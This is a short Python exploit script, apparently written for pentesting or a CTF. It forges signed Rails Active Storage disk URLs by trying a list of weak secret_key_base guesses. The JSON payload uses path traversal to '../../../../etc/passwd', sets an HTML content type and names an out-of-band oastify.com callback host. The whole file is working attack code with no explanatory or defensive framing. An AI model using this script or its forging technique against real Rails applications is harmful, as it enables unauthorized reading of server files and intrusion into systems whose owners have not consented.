from pwn import *
import base64
import json
import hashlib
import hmac

def rails_key_derivation(secret, salt, length=32, iterations=1000):
    """Emulate Rails' ActiveSupport::KeyGenerator"""
    return hashlib.pbkdf2_hmac('sha1', secret.encode(), salt.encode(), iterations, dklen=length)

def sign_blob(secret_key_base, blob_dict):
    salt = "active_storage_key_generator"
    key = rails_key_derivation(secret_key_base, salt, length=32)
    
    json_blob = json.dumps(blob_dict, separators=(',', ':'))
    b64 = base64.b64encode(json_blob.encode()).decode()

    # Generate signature
    sig = hmac.new(key, msg=b64.encode(), digestmod=hashlib.sha256).hexdigest()

    return f"/rails/active_storage/disk/{b64}--{sig}/pwned.txt"

# Example weak keys to test
secrets = ["changeme", "development", "secret", "123456", "myapp", "pentest", "appisgoesweb"]

# JSON blob to inject
payload = {
    "_rails": {
        "data": {
            "key": "../../../../etc/passwd",
            "disposition": "inline; filename=\"pwned.txt\"; filename*=UTF-8''pwned.txt",
            "content_type": "text/html",
            "service_name": "0pqhu9yqm4oeni2x77vhttlvomuei66v.oastify.com"
        },
        "pur": "blob_key"
    }
}

# Try forging a few URLs
for secret in secrets:
    url = sign_blob(secret, payload)
    print(f"[+] Trying secret: {secret}")
    print(url)
    print()
